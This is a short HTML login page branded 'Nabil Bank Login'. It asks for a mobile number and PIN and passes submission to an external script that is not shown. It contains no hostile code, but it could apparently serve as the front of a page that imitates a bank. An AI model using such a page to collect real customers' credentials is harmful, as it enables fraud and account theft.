<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Nabil Bank Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>Nabil Bank Login</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Enter your mobile number" required>
            <input type="password" id="password" placeholder="Enter your PIN" required>
            <button type="submit">Login to Your Account</button>
        </form>
    </div>

    <script src="script.js"></script>
</body>
</html>
